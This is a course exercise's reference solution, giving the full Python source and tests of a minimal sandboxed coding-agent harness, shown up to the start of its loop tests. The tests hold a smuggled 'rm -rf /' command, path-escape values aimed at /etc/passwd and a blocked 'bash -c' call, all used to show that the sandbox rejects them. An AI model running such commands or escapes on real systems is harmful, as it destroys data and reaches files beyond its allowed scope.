# mod-209-building-custom-harnesses/exercise-01-build-a-minimal-harness — Solution

## Approach

The exercise asks for a coding-agent harness small enough to read in one
sitting. The model is the easy part. Most of the code is the machinery around
it: what the model may touch, what happens when a tool fails, and when to stop.

The design has one rule: **a tool call can fail in many ways, but it always
produces a tool result.** Each call goes through a fixed pipeline:

```text
lookup -> schema check -> pre_tool hooks -> permission gate -> run -> post_tool hooks
```

Any step can end the call early. When it does, the model gets an `is_error`
tool result that says which step stopped it and why. The loop never raises
because of a tool. This matters for two reasons. The model can read the error
and adjust. And the Messages API rejects a history in which a `tool_use` block
has no matching `tool_result`, so silently dropping a denied call would break
the next request.

Key decisions:

- **Messages use the Anthropic block format internally.** Assistant turns hold
  `text` and `tool_use` blocks; tool results go back as `tool_result` blocks in
  a user message. `AnthropicModel` then passes history through unchanged, and
  `ScriptedModel` doesn't care. Other providers need a small adapter.
- **Path containment resolves first, then checks.** `Workspace.resolve` calls
  `Path.resolve()`, which follows every existing symlink (including in parent
  directories), and only then checks `is_relative_to(root)`. A string prefix
  check on the raw path misses symlinks, and `startswith("/work")` accepts
  `/work-evil`.
- **The schema validator is stdlib-only.** It covers `type`, `properties`,
  `required`, and `additionalProperties: false`. That is enough for flat tool
  inputs, and it keeps the harness free of runtime dependencies. `anthropic`
  is optional and imported lazily, only for live runs.
- **`run_command` never uses a shell.** The command is split with `shlex`
  and run as an argument vector, so `;`, `|`, and `>` are plain arguments, not
  operators. The program (`argv[0]`) must be on the tool's allowlist. Output
  keeps the head and the tail because the error is usually at the end.
- **Two allowlists, two jobs.** The tool's allowlist is a hard limit: programs
  that may ever run. The policy's `auto_programs` is a smaller set that runs
  without asking. A program that is on the first list but not the second
  (for example `python`, which can do anything) goes to the approver.
- **Hooks run before the permission gate.** This matches Claude Code. A guard
  hook is a hard rule; the gate is a judgment call that may ask a human. Don't
  bother the human about a call the guard would block anyway. A hook that
  crashes blocks the call (fail closed). A post hook that crashes adds a note
  but keeps the result.
- **State is immutable.** `LoopState` is a frozen dataclass. Each step returns
  a new state with a new message tuple. `ScriptedModel` is the one exception:
  it is a test double, and tests need to read its request log.
- **Stop conditions are checked at the top of each iteration**, before
  spending tokens on the next call. Tool calls in the current turn still run,
  so the transcript stays well formed (every call has a result). Loop
  detection counts identical `(name, input)` calls in a row, across turns,
  and stops at three.
- **`Harness._before_model_call` is a no-op extension point.** It exists so
  exercise-04 can add context management in a subclass without editing this
  file. For the same reason, `LoopState` keeps `messages` (what the model
  sees) separate from `transcript` (what happened). They're identical here.

The ported mod-208 exercise-02 rule is the protected-path guard: `write_file` to
`.env*`, anything under `.git/` or `secrets/`, or a lockfile is blocked. The
post-tool example is a syntax check on written `.py` files. It stands in for
"run the linter after every write" without adding a dependency.

## Reference implementation

Layout:

```text
exercise-01-build-a-minimal-harness/
├── harness/
│   ├── __init__.py
│   ├── types.py        # ToolCall, ModelTurn, ToolResult, RunResult
│   ├── workspace.py    # workspace root, symlink-safe path containment
│   ├── schema.py       # stdlib JSON Schema subset validator
│   ├── models.py       # ModelClient protocol, ScriptedModel, AnthropicModel
│   ├── tools.py        # registry + read_file, write_file, list_dir, run_command
│   ├── permissions.py  # PermissionPolicy protocol, RuleBasedPolicy
│   ├── hooks.py        # hook types, protected-path guard, syntax-check note
│   ├── loop.py         # Harness: the loop, the call pipeline, stop conditions
│   └── cli.py          # live entry point with a terminal approver
├── tests/
│   ├── conftest.py     # fixtures and scripted-turn builders
│   ├── test_tools.py   # containment, schema, run_command
│   ├── test_loop.py    # every acceptance criterion
│   └── test_models.py  # AnthropicModel mapping with a fake SDK client
└── pyproject.toml
```

About 780 lines of package code (docstrings and blank lines included) and 425
lines of tests.

### `pyproject.toml`

```toml
[project]
name = "minimal-harness"
version = "0.1.0"
requires-python = ">=3.11"
dependencies = []

[project.optional-dependencies]
live = ["anthropic>=0.40"]
test = ["pytest>=8"]

[tool.pytest.ini_options]
pythonpath = ["."]
testpaths = ["tests"]
```

### `harness/__init__.py`

```python
"""A minimal coding-agent harness: loop, tools, permissions, hooks, stops."""

from harness.loop import Harness
from harness.models import AnthropicModel, ModelClient, ScriptedModel
from harness.permissions import PermissionDecision, RuleBasedPolicy
from harness.tools import ToolRegistry, default_registry
from harness.types import ModelTurn, RunResult, ToolCall, ToolResult
from harness.workspace import PathEscapeError, Workspace

__all__ = [
    "AnthropicModel",
    "Harness",
    "ModelClient",
    "ModelTurn",
    "PathEscapeError",
    "PermissionDecision",
    "RuleBasedPolicy",
    "RunResult",
    "ScriptedModel",
    "ToolCall",
    "ToolRegistry",
    "ToolResult",
    "Workspace",
    "default_registry",
]
```

### `harness/types.py`

```python
"""Value types shared by every part of the harness. All frozen."""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Literal

Decision = Literal["allow", "deny", "ask"]
StopReason = Literal["done", "max_turns", "budget", "loop_detected"]


@dataclass(frozen=True)
class ToolCall:
    id: str
    name: str
    input: dict[str, Any]


@dataclass(frozen=True)
class ModelTurn:
    text: str
    tool_calls: tuple[ToolCall, ...]
    stop_reason: str
    input_tokens: int
    output_tokens: int


@dataclass(frozen=True)
class ToolResult:
    tool_use_id: str
    content: str
    is_error: bool = False

    def to_block(self) -> dict[str, Any]:
        """Render as an Anthropic-style tool_result content block."""
        return {
            "type": "tool_result",
            "tool_use_id": self.tool_use_id,
            "content": self.content,
            "is_error": self.is_error,
        }


@dataclass(frozen=True)
class RunResult:
    final_text: str
    stop_reason: StopReason
    turns: int
    total_tokens: int
    transcript: tuple[dict, ...] = field(default_factory=tuple)
```

### `harness/workspace.py`

```python
"""Workspace root and path containment.

Every tool path goes through Workspace.resolve. It resolves symlinks first and
only then checks containment, so a link that points outside is caught.
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path


class PathEscapeError(ValueError):
    """Raised when a path resolves outside the workspace root."""


@dataclass(frozen=True)
class Workspace:
    root: Path

    @classmethod
    def at(cls, root: str | Path) -> Workspace:
        resolved = Path(root).resolve(strict=True)
        if not resolved.is_dir():
            raise NotADirectoryError(f"workspace root is not a directory: {resolved}")
        return cls(resolved)

    def resolve(self, path: str) -> Path:
        """Return the absolute, symlink-free path, or raise PathEscapeError."""
        candidate = Path(path)
        if not candidate.is_absolute():
            candidate = self.root / candidate
        # resolve() follows every symlink that exists, including in parents.
        resolved = candidate.resolve(strict=False)
        if not resolved.is_relative_to(self.root):
            raise PathEscapeError(f"path escapes the workspace: {path!r}")
        return resolved

    def relative(self, path: str) -> str:
        """Workspace-relative POSIX path, e.g. 'src/app.py'. '.' for the root."""
        return self.resolve(path).relative_to(self.root).as_posix()
```

### `harness/schema.py`

```python
"""A deliberately small JSON Schema subset validator (stdlib only).

Supports: type, properties, required, additionalProperties: false.
That covers flat tool inputs. Swap in `jsonschema` if your tools nest.
"""

from __future__ import annotations

from typing import Any

_TYPES: dict[str, tuple[type, ...]] = {
    "string": (str,),
    "integer": (int,),
    "number": (int, float),
    "boolean": (bool,),
    "array": (list,),
    "object": (dict,),
}


def _type_ok(value: Any, expected: str) -> bool:
    if expected not in _TYPES:
        raise ValueError(f"unsupported schema type: {expected}")
    # bool is a subclass of int; don't let True pass as an integer.
    if expected in ("integer", "number") and isinstance(value, bool):
        return False
    return isinstance(value, _TYPES[expected])


def validate(value: Any, schema: dict[str, Any]) -> list[str]:
    """Return a list of human-readable errors. Empty list means valid."""
    expected = schema.get("type")
    if expected is not None and not _type_ok(value, expected):
        return [f"expected {expected}, got {type(value).__name__}"]
    if expected != "object":
        return []
    props: dict[str, Any] = schema.get("properties", {})
    errors = [f"missing required field '{k}'" for k in schema.get("required", []) if k not in value]
    for key, item in value.items():
        if key not in props:
            if schema.get("additionalProperties", True) is False:
                errors.append(f"unexpected field '{key}'")
            continue
        errors.extend(f"field '{key}': {e}" for e in validate(item, props[key]))
    return errors
```

### `harness/models.py`

```python
"""Model clients: the protocol, a scripted fake for tests, and Anthropic."""

from __future__ import annotations

import os
from collections.abc import Iterable
from dataclasses import dataclass, field
from functools import cached_property
from typing import Any, Protocol

from harness.types import ModelTurn, ToolCall

DEFAULT_MODEL = "claude-sonnet-4-5"


class ModelClient(Protocol):
    def complete(self, system: str, messages: list[dict], tools: list[dict]) -> ModelTurn: ...


class ScriptExhausted(RuntimeError):
    """The harness asked ScriptedModel for more turns than the test scripted."""


class ScriptedModel:
    """Returns a fixed sequence of turns and records every request.

    This is a test double, so it keeps mutable state (the cursor and the
    request log). Production code never mutates; tests need to inspect.
    """

    def __init__(self, turns: Iterable[ModelTurn]) -> None:
        self._turns = tuple(turns)
        self._cursor = 0
        self.requests: list[dict[str, Any]] = []

    def complete(self, system: str, messages: list[dict], tools: list[dict]) -> ModelTurn:
        self.requests.append({"system": system, "messages": tuple(messages), "tools": tuple(tools)})
        if self._cursor >= len(self._turns):
            raise ScriptExhausted(f"script has only {len(self._turns)} turns")
        turn = self._turns[self._cursor]
        self._cursor += 1
        return turn


@dataclass(frozen=True)
class AnthropicModel:
    """Maps the Anthropic Messages API onto ModelClient.

    The SDK is imported lazily so the package (and every test) works without
    it installed. Pass `client` to inject a fake for offline tests.
    """

    model: str = field(default_factory=lambda: os.environ.get("HARNESS_MODEL", DEFAULT_MODEL))
    max_tokens: int = 4096
    client: Any = None

    @cached_property
    def _sdk(self) -> Any:
        if self.client is not None:
            return self.client
        api_key = os.environ.get("ANTHROPIC_API_KEY")
        if not api_key:
            raise RuntimeError("ANTHROPIC_API_KEY is not set; export it for live runs")
        try:
            import anthropic
        except ImportError as exc:
            raise RuntimeError("live runs need the SDK: pip install anthropic") from exc
        return anthropic.Anthropic(api_key=api_key)

    def complete(self, system: str, messages: list[dict], tools: list[dict]) -> ModelTurn:
        kwargs: dict[str, Any] = {
            "model": self.model,
            "max_tokens": self.max_tokens,
            "system": system,
            "messages": messages,
        }
        if tools:
            kwargs["tools"] = tools
        return _to_turn(self._sdk.messages.create(**kwargs))


def _to_turn(response: Any) -> ModelTurn:
    texts = [b.text for b in response.content if b.type == "text"]
    calls = tuple(
        ToolCall(id=b.id, name=b.name, input=dict(b.input))
        for b in response.content
        if b.type == "tool_use"
    )
    return ModelTurn(
        text="\n".join(texts),
        tool_calls=calls,
        stop_reason=response.stop_reason or "",
        input_tokens=response.usage.input_tokens,
        output_tokens=response.usage.output_tokens,
    )
```

`DEFAULT_MODEL` is a placeholder. Model ids change; check the current models
list in the Anthropic docs and set `HARNESS_MODEL` rather than editing code.

### `harness/tools.py`

```python
"""Tool registry and the four built-in tools.

A tool is a plain function `fn(workspace, input) -> str`. Raise ToolError (or
anything else) to report a failure; the loop turns it into an is_error result.
"""

from __future__ import annotations

import shlex
import subprocess
from collections.abc import Callable, Iterable
from dataclasses import dataclass
from typing import Any

from harness.workspace import Workspace

ToolFn = Callable[[Workspace, dict[str, Any]], str]

COMMAND_TIMEOUT_S = 30
MAX_OUTPUT_CHARS = 8_000
DEFAULT_PROGRAMS = frozenset({"ls", "cat", "grep", "echo", "git", "python", "python3", "pytest"})


class ToolError(Exception):
    """An expected tool failure. The message is shown to the model."""


@dataclass(frozen=True)
class Tool:
    name: str
    description: str
    input_schema: dict[str, Any]
    fn: ToolFn

    def to_schema(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "description": self.description,
            "input_schema": self.input_schema,
        }


@dataclass(frozen=True)
class ToolRegistry:
    tools: tuple[Tool, ...] = ()

    def register(self, tool: Tool) -> ToolRegistry:
        if self.get(tool.name) is not None:
            raise ValueError(f"tool already registered: {tool.name}")
        return ToolRegistry((*self.tools, tool))

    def get(self, name: str) -> Tool | None:
        return next((t for t in self.tools if t.name == name), None)

    def schemas(self) -> list[dict[str, Any]]:
        return [t.to_schema() for t in self.tools]


def _object(props: dict[str, Any], required: Iterable[str]) -> dict[str, Any]:
    return {
        "type": "object",
        "properties": props,
        "required": list(required),
        "additionalProperties": False,
    }


def read_file(ws: Workspace, args: dict[str, Any]) -> str:
    path = ws.resolve(args["path"])
    if not path.is_file():
        raise ToolError(f"not a file: {args['path']}")
    return path.read_text(encoding="utf-8", errors="replace")


def write_file(ws: Workspace, args: dict[str, Any]) -> str:
    path = ws.resolve(args["path"])
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(args["content"], encoding="utf-8")
    return f"wrote {len(args['content'])} chars to {ws.relative(args['path'])}"


def list_dir(ws: Workspace, args: dict[str, Any]) -> str:
    path = ws.resolve(args.get("path", "."))
    if not path.is_dir():
        raise ToolError(f"not a directory: {args.get('path', '.')}")
    entries = sorted(p.name + ("/" if p.is_dir() else "") for p in path.iterdir())
    return "\n".join(entries) or "(empty)"


def truncate_middle(text: str, limit: int = MAX_OUTPUT_CHARS) -> str:
    """Keep the head and tail. Errors usually live at the end of output."""
    if len(text) <= limit:
        return text
    half = limit // 2
    dropped = len(text) - 2 * half
    return f"{text[:half]}\n[... truncated {dropped} chars ...]\n{text[-half:]}"


def make_run_command(
    programs: frozenset[str] = DEFAULT_PROGRAMS,
    timeout_s: int = COMMAND_TIMEOUT_S,
    max_chars: int = MAX_OUTPUT_CHARS,
) -> Tool:
    def run_command(ws: Workspace, args: dict[str, Any]) -> str:
        try:
            argv = shlex.split(args["command"])
        except ValueError as exc:
            raise ToolError(f"could not parse command: {exc}") from exc
        if not argv:
            raise ToolError("empty command")
        if argv[0] not in programs:
            raise ToolError(f"program not allowed: {argv[0]!r}; allowed: {sorted(programs)}")
        try:
            # No shell: pipes, redirects and `;` are just literal arguments.
            proc = subprocess.run(
                argv,
                cwd=ws.root,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                timeout=timeout_s,
            )
        except subprocess.TimeoutExpired as exc:
            raise ToolError(f"command timed out after {timeout_s}s") from exc
        except FileNotFoundError as exc:
            raise ToolError(f"program not found: {argv[0]}") from exc
        output = truncate_middle(proc.stdout, max_chars)
        return f"exit code: {proc.returncode}\n{output}"

    schema = _object({"command": {"type": "string"}}, ["command"])
    desc = (
        f"Run one program (no shell) in the workspace root. Allowed: {', '.join(sorted(programs))}."
    )
    return Tool("run_command", desc, schema, run_command)


def default_registry(run_command: Tool | None = None) -> ToolRegistry:
    path_only = _object({"path": {"type": "string"}}, ["path"])
    return (
        ToolRegistry()
        .register(
            Tool("read_file", "Read a UTF-8 text file in the workspace.", path_only, read_file)
        )
        .register(
            Tool(
                "write_file",
                "Create or overwrite a file in the workspace with the given content.",
                _object(
                    {"path": {"type": "string"}, "content": {"type": "string"}}, ["path", "content"]
                ),
                write_file,
            )
        )
        .register(
            Tool(
                "list_dir",
                "List a directory in the workspace.",
                _object({"path": {"type": "string"}}, []),
                list_dir,
            )
        )
        .register(run_command or make_run_command())
    )
```

### `harness/permissions.py`

```python
"""Permission gate: every tool call gets allow, deny, or ask."""

from __future__ import annotations

import shlex
from collections.abc import Callable
from dataclasses import dataclass
from typing import Protocol

from harness.types import Decision, ToolCall
from harness.workspace import PathEscapeError, Workspace

Approver = Callable[[ToolCall, str], bool]


@dataclass(frozen=True)
class PermissionDecision:
    decision: Decision
    reason: str


class PermissionPolicy(Protocol):
    def decide(self, call: ToolCall) -> PermissionDecision: ...


def _path_matches(rel: str, prefix: str) -> bool:
    """'src/' matches anything under src; 'progress.md' matches only that file."""
    return rel.startswith(prefix) if prefix.endswith("/") else rel == prefix


@dataclass(frozen=True)
class RuleBasedPolicy:
    workspace: Workspace
    read_tools: frozenset[str] = frozenset({"read_file", "list_dir"})
    write_prefixes: tuple[str, ...] = ("src/", "tests/")
    auto_programs: frozenset[str] = frozenset({"ls", "cat", "grep", "echo", "pytest"})

    def decide(self, call: ToolCall) -> PermissionDecision:
        if call.name in self.read_tools:
            return PermissionDecision("allow", "reads are always allowed")
        if call.name == "write_file":
            return self._decide_write(str(call.input.get("path", "")))
        if call.name == "run_command":
            return self._decide_command(str(call.input.get("command", "")))
        return PermissionDecision("ask", f"no rule for tool {call.name!r}")

    def _decide_write(self, path: str) -> PermissionDecision:
        try:
            # Resolve first so 'src/../secrets.txt' can't pass a prefix check.
            rel = self.workspace.relative(path)
        except PathEscapeError as exc:
            return PermissionDecision("deny", str(exc))
        if any(_path_matches(rel, p) for p in self.write_prefixes):
            return PermissionDecision("allow", f"writes allowed under {self.write_prefixes}")
        return PermissionDecision("ask", f"write to {rel} is outside {self.write_prefixes}")

    def _decide_command(self, command: str) -> PermissionDecision:
        try:
            program = shlex.split(command)[0]
        except (ValueError, IndexError):
            return PermissionDecision("deny", "command is empty or unparseable")
        if program in self.auto_programs:
            return PermissionDecision("allow", f"{program} is on the auto-allow list")
        return PermissionDecision("ask", f"{program} is not on the auto-allow list")
```

### `harness/hooks.py`

```python
"""Hook types and one rule ported from the mod-208 exercise-02 guard.

A pre_tool hook returns a reason string to block the call, or None to allow.
A post_tool hook returns a note to append to the result, or None.
"""

from __future__ import annotations

import fnmatch
from collections.abc import Callable
from pathlib import PurePosixPath

from harness.types import ToolCall, ToolResult

PreToolHook = Callable[[ToolCall], str | None]
PostToolHook = Callable[[ToolCall, ToolResult], str | None]

# Same config shape as the mod-208 exercise-02 guard: data, not scattered ifs.
PROTECTED_GLOBS = (".env", ".env.*", "uv.lock", "package-lock.json")
PROTECTED_DIRS = (".git", "secrets")


def protected_path_reason(path: str) -> str | None:
    parts = PurePosixPath(path).parts
    if any(d in parts for d in PROTECTED_DIRS):
        return f"writes under {PROTECTED_DIRS} are blocked: {path}"
    name = parts[-1] if parts else ""
    if any(fnmatch.fnmatch(name, g) for g in PROTECTED_GLOBS):
        return f"{name} is a protected file; edit it by hand"
    return None


def block_protected_writes(call: ToolCall) -> str | None:
    """pre_tool: refuse write_file to .env*, .git/, secrets/, and lockfiles."""
    if call.name != "write_file":
        return None
    return protected_path_reason(str(call.input.get("path", "")))


def python_syntax_note(call: ToolCall, result: ToolResult) -> str | None:
    """post_tool: after writing a .py file, report a syntax error if there is one.

    A stand-in for "run the linter after every write". Stdlib only.
    """
    path = str(call.input.get("path", ""))
    if call.name != "write_file" or result.is_error or not path.endswith(".py"):
        return None
    try:
        compile(str(call.input.get("content", "")), path, "exec")
    except SyntaxError as exc:
        return f"syntax error in {path} line {exc.lineno}: {exc.msg}"
    return None
```

### `harness/loop.py`

```python
"""The agent loop and the per-call pipeline around it.

Per call: lookup -> schema check -> pre_tool hooks -> permission -> run ->
post_tool hooks. Every failure becomes an is_error tool result, so the model
reads what went wrong and the loop keeps going.
"""

from __future__ import annotations

import json
from dataclasses import dataclass, field, replace
from typing import Any

from harness.hooks import PostToolHook, PreToolHook
from harness.models import ModelClient
from harness.permissions import Approver, PermissionPolicy
from harness.schema import validate
from harness.tools import Tool, ToolError, ToolRegistry, default_registry
from harness.types import ModelTurn, RunResult, StopReason, ToolCall, ToolResult
from harness.workspace import PathEscapeError, Workspace

LOOP_REPEAT_LIMIT = 3
DEFAULT_SYSTEM = (
    "You are a coding agent working in a sandboxed workspace. Use the tools to "
    "inspect and change files. Paths are relative to the workspace root. When "
    "the task is complete, reply with a short summary and no tool calls."
)


@dataclass(frozen=True)
class LoopState:
    """Everything the loop knows. Each step returns a new LoopState.

    `messages` is what the model sees; `transcript` is what happened. They are
    identical here. exercise-04 trims `messages` and keeps `transcript` whole.
    """

    messages: tuple[dict, ...]
    transcript: tuple[dict, ...]
    turns: int = 0
    tokens: int = 0
    last_call: str = ""
    repeats: int = 0
    final_text: str = ""

    def append(self, *msgs: dict) -> LoopState:
        return replace(self, messages=(*self.messages, *msgs), transcript=(*self.transcript, *msgs))


@dataclass(frozen=True)
class Harness:
    model: ModelClient
    workspace: Workspace
    policy: PermissionPolicy
    registry: ToolRegistry = field(default_factory=default_registry)
    approver: Approver | None = None
    pre_tool: tuple[PreToolHook, ...] = ()
    post_tool: tuple[PostToolHook, ...] = ()
    system: str = DEFAULT_SYSTEM
    max_turns: int = 20
    token_budget: int = 200_000

    def run(self, task: str) -> RunResult:
        first = {"role": "user", "content": task}
        return self._loop(LoopState(messages=(first,), transcript=(first,)))

    def _loop(self, state: LoopState) -> RunResult:
        tools = self.registry.schemas()
        while True:
            stop = self._limit_reached(state)
            if stop is not None:
                return _result(state, stop)
            state = self._before_model_call(state)
            turn = self.model.complete(self.system, list(state.messages), tools)
            state = replace(
                state.append(_assistant_message(turn)),
                turns=state.turns + 1,
                tokens=state.tokens + turn.input_tokens + turn.output_tokens,
                final_text=turn.text,
            )
            if not turn.tool_calls:
                return _result(state, "done")
            results = tuple(self.execute(call) for call in turn.tool_calls)
            state, looped = _track_repeats(state.append(_results_message(results)), turn.tool_calls)
            if looped:
                return _result(state, "loop_detected")

    def _limit_reached(self, state: LoopState) -> StopReason | None:
        if state.tokens > self.token_budget:
            return "budget"
        if state.turns >= self.max_turns:
            return "max_turns"
        return None

    def _before_model_call(self, state: LoopState) -> LoopState:
        """Extension point. exercise-04 overrides this to manage context."""
        return state

    def execute(self, call: ToolCall) -> ToolResult:
        tool = self.registry.get(call.name)
        if tool is None:
            return _error(call, f"unknown tool {call.name!r}")
        problems = validate(call.input, tool.input_schema)
        if problems:
            return _error(call, f"invalid input for {call.name}: " + "; ".join(problems))
        blocked = self._pre_tool_block(call)
        if blocked is not None:
            return _error(call, f"blocked by hook: {blocked}")
        denied = self._permission_denial(call)
        if denied is not None:
            return _error(call, f"permission denied: {denied}")
        return self._post_tool_notes(call, self._invoke(tool, call))

    def _pre_tool_block(self, call: ToolCall) -> str | None:
        for hook in self.pre_tool:
            try:
                reason = hook(call)
            except Exception as exc:  # a broken guard fails closed
                return f"pre_tool hook {getattr(hook, '__name__', hook)!r} crashed: {exc}"
            if reason is not None:
                return reason
        return None

    def _permission_denial(self, call: ToolCall) -> str | None:
        verdict = self.policy.decide(call)
        if verdict.decision == "allow":
            return None
        if verdict.decision == "deny":
            return verdict.reason
        if self.approver is None:
            return f"needs approval ({verdict.reason}) and no approver is configured"
        if self.approver(call, verdict.reason):
            return None
        return f"the user declined ({verdict.reason})"

    def _invoke(self, tool: Tool, call: ToolCall) -> ToolResult:
        try:
            return ToolResult(call.id, tool.fn(self.workspace, call.input))
        except (ToolError, PathEscapeError) as exc:
            return _error(call, str(exc))
        except Exception as exc:  # any tool bug is reported, never raised
            return _error(call, f"{type(exc).__name__}: {exc}")

    def _post_tool_notes(self, call: ToolCall, result: ToolResult) -> ToolResult:
        notes = []
        for hook in self.post_tool:
            try:
                note = hook(call, result)
            except Exception as exc:  # a broken formatter shouldn't hide the result
                note = f"post_tool hook {getattr(hook, '__name__', hook)!r} failed: {exc}"
            if note:
                notes.append(note)
        if not notes:
            return result
        return replace(result, content=result.content + "".join(f"\n\n[note] {n}" for n in notes))


def _error(call: ToolCall, message: str) -> ToolResult:
    return ToolResult(call.id, message, is_error=True)


def _assistant_message(turn: ModelTurn) -> dict[str, Any]:
    blocks: list[dict[str, Any]] = [{"type": "text", "text": turn.text}] if turn.text else []
    blocks += [
        {"type": "tool_use", "id": c.id, "name": c.name, "input": c.input} for c in turn.tool_calls
    ]
    return {"role": "assistant", "content": blocks or [{"type": "text", "text": "(empty)"}]}


def _results_message(results: tuple[ToolResult, ...]) -> dict[str, Any]:
    return {"role": "user", "content": [r.to_block() for r in results]}


def _track_repeats(state: LoopState, calls: tuple[ToolCall, ...]) -> tuple[LoopState, bool]:
    last, repeats, looped = state.last_call, state.repeats, False
    for call in calls:
        signature = call.name + json.dumps(call.input, sort_keys=True)
        repeats = repeats + 1 if signature == last else 1
        last = signature
        looped = looped or repeats >= LOOP_REPEAT_LIMIT
    return replace(state, last_call=last, repeats=repeats), looped


def _result(state: LoopState, stop: StopReason) -> RunResult:
    return RunResult(
        final_text=state.final_text,
        stop_reason=stop,
        turns=state.turns,
        total_tokens=state.tokens,
        transcript=state.transcript,
    )
```

### `harness/cli.py`

```python
"""Live entry point: python -m harness.cli --workspace DIR "task".

Uses AnthropicModel, the rule-based policy, and a terminal approver for `ask`.
"""

from __future__ import annotations

import argparse
import json
import sys

from harness.hooks import block_protected_writes, python_syntax_note
from harness.loop import Harness
from harness.models import AnthropicModel
from harness.permissions import RuleBasedPolicy
from harness.types import ToolCall
from harness.workspace import Workspace


def terminal_approver(call: ToolCall, reason: str) -> bool:
    print(f"\n[approve?] {call.name} {json.dumps(call.input)[:300]}\n  reason: {reason}")
    return input("  allow? [y/N] ").strip().lower() == "y"


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Run the minimal harness against a real model.")
    parser.add_argument("--workspace", required=True, help="directory the agent may touch")
    parser.add_argument("--max-turns", type=int, default=20)
    parser.add_argument("--budget", type=int, default=100_000, help="total token budget")
    parser.add_argument("task", help="what the agent should do")
    args = parser.parse_args(argv)

    workspace = Workspace.at(args.workspace)
    harness = Harness(
        model=AnthropicModel(),
        workspace=workspace,
        policy=RuleBasedPolicy(workspace),
        approver=terminal_approver,
        pre_tool=(block_protected_writes,),
        post_tool=(python_syntax_note,),
        max_turns=args.max_turns,
        token_budget=args.budget,
    )
    try:
        result = harness.run(args.task)
    except RuntimeError as exc:  # missing key or SDK: say so, no traceback
        print(f"error: {exc}", file=sys.stderr)
        return 2
    print(f"\n{result.final_text}\n")
    print(f"stop={result.stop_reason} turns={result.turns} tokens={result.total_tokens}")
    return 0 if result.stop_reason == "done" else 1


if __name__ == "__main__":
    sys.exit(main())
```

### `tests/conftest.py`

```python
"""Shared fixtures and tiny builders for scripted turns."""

from __future__ import annotations

import itertools
from collections.abc import Callable
from typing import Any

import pytest

from harness.loop import Harness
from harness.models import ScriptedModel
from harness.permissions import RuleBasedPolicy
from harness.types import ModelTurn, ToolCall
from harness.workspace import Workspace

_ids = itertools.count(1)


def call(name: str, **args: Any) -> ToolCall:
    return ToolCall(id=f"toolu_{next(_ids)}", name=name, input=args)


def turn(*calls: ToolCall, text: str = "", tokens: tuple[int, int] = (10, 5)) -> ModelTurn:
    stop = "tool_use" if calls else "end_turn"
    return ModelTurn(text, tuple(calls), stop, tokens[0], tokens[1])


def results_in(request: dict) -> list[dict]:
    """tool_result blocks in the last message of a recorded model request."""
    return [b for b in request["messages"][-1]["content"] if b.get("type") == "tool_result"]


@pytest.fixture
def ws(tmp_path) -> Workspace:
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "app.py").write_text("print('hi')\n")
    (tmp_path / "README.md").write_text("# demo\n")
    return Workspace.at(tmp_path)


@pytest.fixture
def make_harness(ws) -> Callable[..., tuple[Harness, ScriptedModel]]:
    def build(*turns: ModelTurn, **overrides: Any) -> tuple[Harness, ScriptedModel]:
        model = ScriptedModel(turns)
        kwargs: dict[str, Any] = {"model": model, "workspace": ws, "policy": RuleBasedPolicy(ws)}
        return Harness(**{**kwargs, **overrides}), model

    return build
```

### `tests/test_tools.py`

```python
"""Workspace containment, schema validation, and run_command behavior."""

from __future__ import annotations

import os
import sys

import pytest

from harness.schema import validate
from harness.tools import (
    ToolError,
    list_dir,
    make_run_command,
    read_file,
    truncate_middle,
    write_file,
)
from harness.workspace import PathEscapeError


def test_resolve_accepts_paths_inside(ws):
    assert ws.relative("src/app.py") == "src/app.py"
    assert ws.relative("src/../README.md") == "README.md"


@pytest.mark.parametrize("path", ["../../etc/passwd", "/etc/passwd", "src/../../outside.txt"])
def test_resolve_rejects_escapes(ws, path):
    with pytest.raises(PathEscapeError):
        ws.resolve(path)


def test_symlink_pointing_out_is_rejected(ws, tmp_path_factory):
    outside = tmp_path_factory.mktemp("outside")
    (outside / "secret.txt").write_text("nope")
    os.symlink(outside, ws.root / "link")
    with pytest.raises(PathEscapeError):
        read_file(ws, {"path": "link/secret.txt"})
    with pytest.raises(PathEscapeError):
        write_file(ws, {"path": "link/new.txt", "content": "x"})
    assert not (outside / "new.txt").exists()


def test_read_write_list(ws):
    assert "wrote" in write_file(ws, {"path": "tests/test_a.py", "content": "x = 1\n"})
    assert read_file(ws, {"path": "tests/test_a.py"}) == "x = 1\n"
    assert list_dir(ws, {"path": "."}).splitlines() == ["README.md", "src/", "tests/"]
    with pytest.raises(ToolError):
        read_file(ws, {"path": "src"})


def test_schema_validator():
    schema = {
        "type": "object",
        "properties": {"path": {"type": "string"}, "n": {"type": "integer"}},
        "required": ["path"],
        "additionalProperties": False,
    }
    assert validate({"path": "a"}, schema) == []
    assert validate({}, schema) == ["missing required field 'path'"]
    assert validate({"path": 3}, schema) == ["field 'path': expected string, got int"]
    assert validate({"path": "a", "n": True}, schema) == ["field 'n': expected integer, got bool"]
    assert validate({"path": "a", "x": 1}, schema) == ["unexpected field 'x'"]


def test_run_command_allowlist_and_no_shell(ws):
    tool = make_run_command(frozenset({"echo"}))
    assert tool.fn(ws, {"command": "echo hello; rm -rf /"}) == "exit code: 0\nhello; rm -rf /\n"
    with pytest.raises(ToolError, match="not allowed"):
        tool.fn(ws, {"command": "bash -c 'echo hi'"})
    with pytest.raises(ToolError, match="could not parse"):
        tool.fn(ws, {"command": "echo 'unterminated"})


def test_run_command_timeout(ws):
    tool = make_run_command(frozenset({sys.executable}), timeout_s=1)
    with pytest.raises(ToolError, match="timed out after 1s"):
        tool.fn(ws, {"command": f"{sys.executable} -c 'import time; time.sleep(5)'"})


def test_run_command_truncates_head_and_tail(ws):
    tool = make_run_command(frozenset({sys.executable}), max_chars=100)
    script = "print('HEAD' + 'x' * 500 + 'TAIL')"
    out = tool.fn(ws, {"command": f'{sys.executable} -c "{script}"'})
    assert "HEAD" in out and "TAIL" in out and "[... truncated" in out
    assert len(out) < 200


def test_truncate_middle_leaves_short_text_alone():
    assert truncate_middle("short", 100) == "short"
```

### `tests/test_loop.py`

```python
"""Acceptance criteria for the loop, gate, hooks, and stop conditions."""

from __future__ import annotations

import os

from conftest import call, results_in, turn

from harness.hooks import block_protected_writes, python_syntax_note
from harness.permissions import PermissionDecision
